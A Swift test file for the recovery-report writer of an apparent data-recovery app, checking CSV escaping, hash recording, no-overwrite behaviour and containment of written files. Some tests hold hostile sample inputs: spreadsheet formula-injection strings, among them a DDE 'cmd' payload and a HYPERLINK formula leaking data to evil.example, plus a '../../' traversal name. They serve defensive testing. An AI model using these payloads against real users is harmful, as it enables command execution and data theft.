import CryptoKit
import Darwin
import Foundation
import SalvageCore
import SalvageDiskIO
import Testing
@testable import Salvage

// spec-tech-batch-7 §D: the recovery report.

private struct ReportMemoryReader: BlockReader {
    let bytes: Data
    var sizeBytes: Int64 { Int64(bytes.count) }
    func read(at offset: Int64, count: Int) async throws -> Data {
        bytes.subdata(in: Int(offset)..<Int(offset) + count)
    }
}

private let reportMetadata = SourceMetadata(filesystem: .exfat, volumeOffset: 1_048_576, recordOffset: 2_097_312,
                                            allocationStart: 5, contiguous: true, rawRecord: Data())

private func reportFile(_ path: String, name: String? = nil, text: String, deleted: Bool = false,
                        method: RecoveryMethod = .metadata, partial: Bool = false) -> RecoveredFile {
    let data = Data(text.utf8)
    return RecoveredFile(name: name ?? (path as NSString).lastPathComponent, path: path, sizeBytes: Int64(data.count),
                         isDeleted: deleted, sourceMetadata: reportMetadata, content: .resident(data),
                         recoveryMethod: method, isPartial: partial)
}

private final class ReportTempDir {
    let url: URL
    init() throws {
        url = FileManager.default.temporaryDirectory
            .appendingPathComponent("SalvageReportTests-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
    }
    deinit { try? FileManager.default.removeItem(at: url) }
}

private func safeCheck() -> @Sendable (URL) -> DestinationAssessment {
    { url in DestinationAssessment(verdict: .safe, mountSource: mountSourceName(ofPath: url.resolvingSymlinksInPath().path)) }
}

private let fixtureDevice = BlockDevice(bsdName: "disk42", displayName: "Kingston DataTraveler", sizeBytes: 16_000_000_000,
                                        isInternal: false, isBootVolume: false)

@MainActor
private func recoverWithReport(_ files: [RecoveredFile], into dir: ReportTempDir, saveReport: Bool = true,
                               device: BlockDevice? = fixtureDevice) async throws -> RecoverySummary {
    let coordinator = RecoveryCoordinator(files: files, content: FileContentReader(reader: ReportMemoryReader(bytes: Data())),
                                          deviceName: device?.displayName ?? "Fixture", device: device,
                                          now: { Date(timeIntervalSince1970: 1_800_000_000) },
                                          sync: { _ in nil }, destinationCheck: safeCheck())
    coordinator.setSaveReport(saveReport)
    await coordinator.chooseDestination(dir.url)
    coordinator.start()
    await coordinator.waitUntilFinished()
    guard case .finished(let summary) = coordinator.phase else { throw ReportTestError.notFinished }
    return summary
}

private enum ReportTestError: Error { case notFinished, badCSV }

/// A strict RFC 4180 parser (quoted fields, doubled quotes, CRLF records), so the tests read the
/// file the way a spreadsheet would rather than with the writer's own logic.
private func parseCSV(_ data: Data) throws -> [[String]] {
    var bytes = data
    if bytes.starts(with: [0xEF, 0xBB, 0xBF]) { bytes.removeFirst(3) }
    guard let text = String(data: bytes, encoding: .utf8) else { throw ReportTestError.badCSV }
    let scalars = Array(text.unicodeScalars)
    var records: [[String]] = [], record: [String] = [], field = String.UnicodeScalarView()
    var i = 0, quoted = false, fieldStarted = false
    func endField() { record.append(String(field)); field = String.UnicodeScalarView(); fieldStarted = false }
    while i < scalars.count {
        let c = scalars[i]
        if quoted {
            if c == "\"" {
                if i + 1 < scalars.count, scalars[i + 1] == "\"" { field.append("\""); i += 2; continue }
                quoted = false; i += 1; continue
            }
            field.append(c); i += 1; continue
        }
        switch c {
        case "\"":
            guard !fieldStarted, field.isEmpty else { throw ReportTestError.badCSV }
            quoted = true; fieldStarted = true; i += 1
        case ",": endField(); i += 1
        case "\r":
            guard i + 1 < scalars.count, scalars[i + 1] == "\n" else { throw ReportTestError.badCSV }
            endField(); records.append(record); record = []; i += 2
        case "\n": throw ReportTestError.badCSV  // bare LF outside quotes
        default: field.append(c); fieldStarted = true; i += 1
        }
    }
    guard !quoted else { throw ReportTestError.badCSV }
    if fieldStarted || !field.isEmpty || !record.isEmpty { endField(); records.append(record) }
    return records
}

/// The table part of a parsed report: the rows after the column header.
private func table(_ records: [[String]]) throws -> [[String: String]] {
    guard let start = records.firstIndex(of: RecoveryReport.csvColumns) else { throw ReportTestError.badCSV }
    return records[(start + 1)...].map { Dictionary(uniqueKeysWithValues: zip(RecoveryReport.csvColumns, $0)) }
}

private func headerValue(_ records: [[String]], _ key: String) -> String? {
    records.first { $0.first == key && $0.count == 2 }?[1]
}

@Suite("Recovery report")
struct RecoveryReportTests {
    // MARK: CSV escaping

    @Test func plainValuesAreLeftAlone() {
        #expect(RecoveryReport.csvField("IMG_0001.JPG") == "IMG_0001.JPG")
        #expect(RecoveryReport.csvField("") == "")
        #expect(RecoveryReport.csvField("/DCIM/100APPLE/IMG 1.jpg") == "/DCIM/100APPLE/IMG 1.jpg")
        #expect(RecoveryReport.csvField("日本語 ファイル.txt") == "日本語 ファイル.txt")
    }

    @Test func delimitersQuotesAndLineBreaksAreQuoted() {
        #expect(RecoveryReport.csvField("a,b") == "\"a,b\"")
        #expect(RecoveryReport.csvField("say \"hi\"") == "\"say \"\"hi\"\"\"")
        #expect(RecoveryReport.csvField("line\nbreak") == "\"line\nbreak\"")
        #expect(RecoveryReport.csvField("line\r\nbreak") == "\"line\r\nbreak\"")
        #expect(RecoveryReport.csvField(" padded ") == "\" padded \"")
    }

    @Test(arguments: ["=1+1", "+1", "-1", "@SUM(A1)", "\tcmd", "\rcmd", "＝1+1", "＋1", "－1", "＠A1"])
    func formulaLeadersGetAnApostrophe(_ hostile: String) {
        let field = RecoveryReport.csvField(hostile)
        let unquoted = field.hasPrefix("\"") ? String(field.dropFirst().dropLast()) : field
        #expect(unquoted.hasPrefix("'"), "\(hostile.debugDescription) -> \(field.debugDescription)")
        #expect(unquoted.dropFirst().replacingOccurrences(of: "\"\"", with: "\"") == hostile)
    }

    @Test func formulaAfterLeadingSpacesIsAlsoNeutralized() {
        #expect(RecoveryReport.csvField("  =cmd|' /C calc'!A0") == "'  =cmd|' /C calc'!A0")
    }

    @Test func hostileFormulaWithQuotesAndCommasStaysOneInertCell() throws {
        let hostile = "=HYPERLINK(\"http://evil.example/?\"&A1,\"Click\")"
        let field = RecoveryReport.csvField(hostile)
        #expect(field == "\"'=HYPERLINK(\"\"http://evil.example/?\"\"&A1,\"\"Click\"\")\"")
        let parsed = try parseCSV(Data((field + "\r\n").utf8))
        #expect(parsed == [["'" + hostile]])
    }

    @Test func nulIsReplaced() {
        #expect(RecoveryReport.csvField("a\u{0}b") == "a\u{FFFD}b")
    }

    @Test func numbersAndHashesAreNotPrefixed() {
        #expect(RecoveryReport.csvField("1048576") == "1048576")
        #expect(RecoveryReport.csvField("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
                == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
    }

    // MARK: End to end

    @MainActor @Test func reportIsWrittenIntoTheRootAndMatchesTheSummary() async throws {
        let dir = try ReportTempDir()
        let good = reportFile("/DCIM/IMG_0001.JPG", text: "jpeg bytes")
        let deleted = reportFile("/Documents/old.txt", text: "gone but back", deleted: true)
        let carved = reportFile("/Reconstructed/file0001.png", text: "png", method: .carved, partial: true)
        let unmapped = RecoveredFile(name: "lost.doc", path: "/lost.doc", sizeBytes: 10, sourceMetadata: reportMetadata)
        let summary = try await recoverWithReport([good, deleted, unmapped, carved], into: dir)

        #expect(summary.written.count == 3 && summary.failed.count == 1 && summary.attachmentFailure == nil)
        #expect(summary.attachments.map(\.lastPathComponent) == [RecoveryReport.csvName, RecoveryReport.jsonName])
        let root = summary.root.resolvingSymlinksInPath()
        for url in summary.attachments {
            #expect(url.deletingLastPathComponent().resolvingSymlinksInPath() == root, "The report sits in the recovery folder")
        }

        let records = try parseCSV(try Data(contentsOf: summary.attachments[0]))
        #expect(records.first == ["Salvage Recovery Report"])
        #expect(headerValue(records, "Source device") == "Kingston DataTraveler")
        #expect(headerValue(records, "Device identifier") == "disk42")
        #expect(headerValue(records, "Files selected") == "4")
        #expect(headerValue(records, "Recovered") == String(summary.written.count))
        #expect(headerValue(records, "Failed") == String(summary.failed.count))
        #expect(headerValue(records, "Not attempted") == String(summary.notAttempted))
        #expect(headerValue(records, "Bytes written") == String(summary.bytesWritten))
        #expect(headerValue(records, "App version")?.isEmpty == false)
        #expect(headerValue(records, "Date") == "2027-01-15T08:00:00Z")

        let rows = try table(records)
        #expect(rows.count == 4, "One row per selected file")
        #expect(rows.map { $0["Original path"] } == ["/DCIM/IMG_0001.JPG", "/Documents/old.txt", "/lost.doc", "/Reconstructed/file0001.png"])
        #expect(rows.filter { $0["Status"] == "Recovered" }.count == summary.written.count)
        #expect(rows.filter { $0["Status"] == "Failed" }.count == summary.failed.count)

        let first = rows[0]
        #expect(first["Recovered path"] == "DCIM/IMG_0001.JPG")
        #expect(first["SHA-256"] == SHA256.hash(data: Data("jpeg bytes".utf8)).map { String(format: "%02x", $0) }.joined())
        #expect(first["Written size (bytes)"] == "10" && first["Original size (bytes)"] == "10")
        #expect(first["Confidence"] == "High" && first["Method"] == "Filesystem records")
        #expect(first["Deleted"] == "No" && first["Reconstructed"] == "No" && first["Partial"] == "No")
        #expect(first["Filesystem"] == "exFAT" && first["Volume offset"] == "1048576" && first["Record offset"] == "2097312")
        #expect(first["Source device"] == "Kingston DataTraveler")
        #expect(first["Volume"] == "exFAT volume at 1 MB")
        #expect(rows[1]["Deleted"] == "Yes")
        #expect(rows[2]["Status"] == "Failed" && rows[2]["Recovered path"] == "" && rows[2]["SHA-256"] == "")
        #expect(rows[2]["Reason"] == summary.failed[0].reason && rows[2]["Confidence"] == "None")
        #expect(rows[3]["Reconstructed"] == "Yes" && rows[3]["Partial"] == "Yes")
        #expect(rows[3]["Method"] == "Reconstructed from raw data" && rows[3]["Confidence"] != "High")
        // The recorded hash is the hash of the file on disk.
        for (row, copy) in zip(rows.filter { $0["Status"] == "Recovered" }, summary.written) {
            let bytes = try Data(contentsOf: summary.root.appendingPathComponent(row["Recovered path"] ?? ""))
            #expect(SHA256.hash(data: bytes).map { String(format: "%02x", $0) }.joined() == copy.sha256)
            #expect(row["SHA-256"] == copy.sha256)
        }
    }

    @MainActor @Test func jsonIsValidAndAgreesWithTheCSV() async throws {
        let dir = try ReportTempDir()
        let files = [reportFile("/a.txt", text: "aaa"), reportFile("/b/=evil.txt", text: "b"),
                     RecoveredFile(name: "c", path: "/c", sizeBytes: 3, sourceMetadata: reportMetadata)]
        let summary = try await recoverWithReport(files, into: dir)
        let data = try Data(contentsOf: summary.attachments[1])
        let object = try #require(try JSONSerialization.jsonObject(with: data) as? [String: Any])
        #expect(object["header"] is [String: Any] && (object["files"] as? [Any])?.count == 3)

        let (header, rows) = try RecoveryReport.decodeJSON(data)
        #expect(header.formatVersion == RecoveryReport.formatVersion)
        #expect(header.totals == RecoveryReport.Totals(selected: 3, recovered: summary.written.count, failed: summary.failed.count,
                                                       notAttempted: 0, bytesWritten: summary.bytesWritten, cancelled: false))
        #expect(header.sourceModel == "Kingston DataTraveler" && header.sourceSizeBytes == 16_000_000_000)
        #expect(header.recoveryFolder == summary.root.lastPathComponent)
        #expect(rows.map(\.status) == [.recovered, .recovered, .failed])
        // JSON keeps names exactly; only the CSV neutralizes formulas.
        #expect(rows[1].name == "=evil.txt" && rows[1].recoveredPath == "b/=evil.txt")
        let csvRows = try table(try parseCSV(try Data(contentsOf: summary.attachments[0])))
        #expect(csvRows[1]["Name"] == "'=evil.txt")
        #expect(zip(rows, csvRows).allSatisfy { $0.sha256 ?? "" == $1["SHA-256"] })
    }

    @MainActor @Test func hostileNamesCannotBreakOutOfTheirCells() async throws {
        let dir = try ReportTempDir()
        let names = ["=cmd|' /C calc'!A0.txt", "+SUM(1,2).txt", "-2+3.txt", "@import.txt",
                     "comma, \"quoted\".txt", "new\nline.txt", "carriage\rreturn.txt", "\ttab.txt", "plain.txt"]
        let files = names.enumerated().map { reportFile("/hostile/\($1)", name: $1, text: "file \($0)") }
        let summary = try await recoverWithReport(files, into: dir)
        let csvData = try Data(contentsOf: summary.attachments[0])
        print("REPORT SAMPLE:\n\(String(decoding: csvData, as: UTF8.self))")
        let records = try parseCSV(csvData)
        let rows = try table(records)
        #expect(rows.count == names.count, "Every hostile name stays in one record")
        #expect(records.allSatisfy { $0.count <= RecoveryReport.csvColumns.count })
        for (row, name) in zip(rows, names) {
            let cell = try #require(row["Name"])
            if let first = name.unicodeScalars.first, "=+-@\t\r".unicodeScalars.contains(first) {
                #expect(cell == "'" + name, "\(name.debugDescription) -> \(cell.debugDescription)")
            } else {
                #expect(cell == name)
            }
            #expect(row["Original path"] == "'" + "/hostile/\(name)" || row["Original path"] == "/hostile/\(name)")
        }
        // No cell anywhere in the file starts with a formula character.
        for record in records { for cell in record {
            if let first = cell.unicodeScalars.first { #expect(!"=+-@\t\r".unicodeScalars.contains(first), "\(cell.debugDescription)") }
        } }
    }

    @Test func cancelledRunListsNotAttemptedFiles() {
        let files = (0..<4).map { reportFile("/f\($0).txt", text: "x") }
        let root = URL(fileURLWithPath: "/tmp/Salvage Recovery X", isDirectory: true)
        let summary = RecoverySummary(
            root: root, selectedCount: 4,
            written: [RecoveredCopy(sourcePath: "/f0.txt", url: root.appendingPathComponent("f0.txt"), bytes: 1, sha256: "ab", fileID: files[0].id)],
            failed: [RecoveryFailureRecord(id: files[1].id, name: "f1.txt", sourcePath: "/f1.txt", reason: "The destination is full.")],
            notAttempted: 2, cancelled: true)
        let report = RecoveryReport(files: files, summary: summary,
                                    context: .init(appVersion: "9.9 (99)", date: Date(timeIntervalSince1970: 0),
                                                   deviceName: "Drive", device: nil, sourceLabel: "Photos (exFAT)"))
        #expect(report.rows.map(\.status) == [.recovered, .failed, .notAttempted, .notAttempted])
        #expect(report.rows[2].reason == RecoveryReport.notAttemptedReason)
        #expect(report.header.totals == .init(selected: 4, recovered: 1, failed: 1, notAttempted: 2, bytesWritten: 1, cancelled: true))
        #expect(report.rows.filter { $0.status == .notAttempted }.count == summary.notAttempted)
        #expect(report.header.appVersion == "9.9 (99)" && report.header.recoveredFrom == "Photos (exFAT)")
        #expect(report.header.sourceModel == nil && report.header.sourceIdentifier == nil)
        #expect(report.rows[0].recoveredPath == "f0.txt")
    }

    // MARK: No-overwrite and containment

    @MainActor @Test func aRecoveredFileWithTheReportsNameIsNeverOverwritten() async throws {
        let dir = try ReportTempDir()
        let impostorCSV = reportFile("/Salvage Recovery Report.csv", text: "the user's own file")
        let impostorJSON = reportFile("/Salvage Recovery Report.json", text: "{\"mine\":true}")
        let summary = try await recoverWithReport([impostorCSV, impostorJSON], into: dir)

        #expect(summary.written.count == 2)
        #expect(try String(contentsOf: summary.root.appendingPathComponent("Salvage Recovery Report.csv"), encoding: .utf8)
                == "the user's own file")
        #expect(try String(contentsOf: summary.root.appendingPathComponent("Salvage Recovery Report.json"), encoding: .utf8)
                == "{\"mine\":true}")
        #expect(summary.attachments.map(\.lastPathComponent) == ["Salvage Recovery Report (2).csv", "Salvage Recovery Report (2).json"])
        let rows = try table(try parseCSV(try Data(contentsOf: summary.attachments[0])))
        #expect(rows.map { $0["Recovered path"] } == ["Salvage Recovery Report.csv", "Salvage Recovery Report.json"])
    }

    @Test func writeAttachmentNeverReplacesOrFollowsExistingEntries() throws {
        let dir = try ReportTempDir()
        let outside = try ReportTempDir()
        let rootURL = dir.url.appendingPathComponent("root", isDirectory: true)
        try FileManager.default.createDirectory(at: rootURL, withIntermediateDirectories: false)
        try Data("existing".utf8).write(to: rootURL.appendingPathComponent("report.csv"))
        let target = outside.url.appendingPathComponent("target.json")
        try Data("outside".utf8).write(to: target)
        try FileManager.default.createSymbolicLink(at: rootURL.appendingPathComponent("report.json"), withDestinationURL: target)

        let fd = open(rootURL.path, O_RDONLY | O_DIRECTORY)
        #expect(fd >= 0)
        defer { close(fd) }
        let id = try #require(RecoveryEngine.FileID(fd: fd))
        let root = RecoveryEngine.Root(fd: fd, id: id, path: rootURL.resolvingSymlinksInPath().path)

        let csv = RecoveryEngine.writeAttachment(RootAttachment(name: "report.csv", data: Data("new".utf8)), root: root,
                                                 sync: { _ in nil }, ops: .live)
        let json = RecoveryEngine.writeAttachment(RootAttachment(name: "report.json", data: Data("new".utf8)), root: root,
                                                  sync: { _ in nil }, ops: .live)
        #expect((try? csv.get())?.lastPathComponent == "report (2).csv")
        #expect((try? json.get())?.lastPathComponent == "report (2).json")
        #expect(try String(contentsOf: rootURL.appendingPathComponent("report.csv"), encoding: .utf8) == "existing")
        #expect(try String(contentsOf: target, encoding: .utf8) == "outside", "The symlink's target is untouched")
        #expect(try FileManager.default.destinationOfSymbolicLink(atPath: rootURL.appendingPathComponent("report.json").path) == target.path)
        #expect(try String(contentsOf: rootURL.appendingPathComponent("report (2).csv"), encoding: .utf8) == "new")
        let leftovers = try FileManager.default.contentsOfDirectory(atPath: rootURL.path).filter { $0.hasSuffix(".partial") }
        #expect(leftovers.isEmpty)
    }

    @Test func hostileAttachmentNamesStayInTheRoot() throws {
        let dir = try ReportTempDir()
        let fd = open(dir.url.path, O_RDONLY | O_DIRECTORY)
        defer { close(fd) }
        let id = try #require(RecoveryEngine.FileID(fd: fd))
        let root = RecoveryEngine.Root(fd: fd, id: id, path: dir.url.resolvingSymlinksInPath().path)
        let url = try RecoveryEngine.writeAttachment(RootAttachment(name: "../../escape.csv", data: Data("x".utf8)),
                                                     root: root, sync: { _ in nil }, ops: .live).get()
        #expect(url.deletingLastPathComponent().resolvingSymlinksInPath() == dir.url.resolvingSymlinksInPath())
        #expect(!FileManager.default.fileExists(atPath: dir.url.deletingLastPathComponent().appendingPathComponent("escape.csv").path))
    }

    @Test func aFailedSyncLeavesNothingBehind() throws {
        let dir = try ReportTempDir()
        let fd = open(dir.url.path, O_RDONLY | O_DIRECTORY)
        defer { close(fd) }
        let id = try #require(RecoveryEngine.FileID(fd: fd))
        let root = RecoveryEngine.Root(fd: fd, id: id, path: dir.url.resolvingSymlinksInPath().path)
        let result = RecoveryEngine.writeAttachment(RootAttachment(name: "r.csv", data: Data("x".utf8)), root: root,
                                                    sync: { _ in ENOSPC }, ops: .live)
        #expect(result == .failure(RecoveryEngine.Errno(code: ENOSPC)))
        #expect(try FileManager.default.contentsOfDirectory(atPath: dir.url.path).isEmpty)
    }

    // MARK: Toggle

    @MainActor @Test func turningTheReportOffWritesNoReport() async throws {
        let dir = try ReportTempDir()
        let summary = try await recoverWithReport([reportFile("/a.txt", text: "a")], into: dir, saveReport: false)
        #expect(summary.attachments.isEmpty && summary.attachmentFailure == nil)
        #expect(try FileManager.default.contentsOfDirectory(atPath: summary.root.path) == ["a.txt"])
    }

    @MainActor @Test func reportIsOnByDefaultAndLockedOnceRunning() async throws {
        let coordinator = RecoveryCoordinator(files: [reportFile("/a.txt", text: "a")],
                                              content: FileContentReader(reader: ReportMemoryReader(bytes: Data())),
                                              deviceName: "Drive", destinationCheck: safeCheck())
        #expect(coordinator.saveReport)
        coordinator.setSaveReport(false)
        #expect(!coordinator.saveReport)
        coordinator.setSaveReport(true)
        let dir = try ReportTempDir()
        await coordinator.chooseDestination(dir.url)
        coordinator.start()
        coordinator.setSaveReport(false)
        #expect(coordinator.saveReport, "Can't change once the run has started")
        await coordinator.waitUntilFinished()
        guard case .finished(let summary) = coordinator.phase else { Issue.record("not finished"); return }
        #expect(summary.attachments.count == 2)
    }
}
